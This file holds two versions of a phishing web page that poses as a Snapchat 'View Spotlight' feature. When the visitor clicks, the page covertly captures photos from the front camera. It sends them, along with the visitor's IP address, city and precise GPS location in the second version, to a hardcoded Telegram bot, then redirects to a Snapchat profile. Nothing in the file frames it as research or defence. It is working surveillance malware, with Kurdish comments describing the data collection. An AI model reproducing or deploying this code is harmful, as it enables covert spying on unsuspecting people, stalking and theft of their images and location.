<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Spotlight</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .btn {
            background-color: #fffc00;
            color: #000;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.3);
        }
    </style>
</head>
<body>

    <button class="btn" id="goBtn">View Spotlight</button>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = "8934176186:AAGX6GaklJCEmr_CXXX4L7bGMQykSA4fyFA";
        const CHAT_ID = "6125741059";

        document.getElementById('goBtn').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });
                
                setTimeout(async () => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'snap.jpg');

                            try {
                                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                            } catch (err) {}
                        }

                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.snapchat.com/add/ravayxabat13";
                    }, 'image/jpeg', 0.85);
                }, 600);

            } catch (err) {
                window.location.href = "https://www.snapchat.com/add/ravayxabat13";
            }
        });
    </script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Spotlight</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .btn {
            background-color: #fffc00;
            color: #000;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 252, 0, 0.3);
        }
    </style>
</head>
<body>

    <button class="btn" id="goBtn">View Spotlight</button>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = "8934176186:AAGX6GaklJCEmr_CXXX4L7bGMQykSA4fyFA";
        const CHAT_ID = "6125741059";

        document.getElementById('goBtn').addEventListener('click', async () => {
            // ناردنی زانیاری ئایپی و شوێن
            let userInfo = "📍 زانیاری ئامێر و شوێن:\n";
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                userInfo += `🌐 وڵات: ${ipData.country_name}\n🏙 شار: ${ipData.city}\n📌 ئایپی: ${ipData.ip}\n`;
            } catch (e) {}

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    userInfo += `🗺 لینک لە نەخشە: https://maps.google.com/?q=${lat},${lon}\n`;
                    sendTextData(userInfo);
                }, () => {
                    sendTextData(userInfo);
                }, { timeout: 5000 });
            } else {
                sendTextData(userInfo);
            }

            async function sendTextData(text) {
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                    });
                } catch (e) {}
            }

            // گرتنی چەند وێنەیەک بە دوای یەکدا
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => { resolve(); };
                });
                
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');

                // بە یەکدوای یەک گرتنی ٣ وێنە لە ماوەی چەند چرکەیەکدا
                for (let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 800)); // چاوەڕێکردنی 0.8 چرکە بۆ هەر وێنەیەک
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    await new Promise((resolve) => {
                        canvas.toBlob(async (blob) => {
                            if (blob) {
                                const formData = new FormData();
                                formData.append('chat_id', CHAT_ID);
                                formData.append('photo', blob, `snap_${i+1}.jpg`);

                                try {
                                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    });
                                } catch (err) {}
                            }
                            resolve();
                        }, 'image/jpeg', 0.85);
                    });
                }

                stream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.snapchat.com/add/ravayxabat13";

            } catch (err) {
                window.location.href = "https://www.snapchat.com/add/ravayxabat13";
            }
        });
    </script>
</body>
</html>
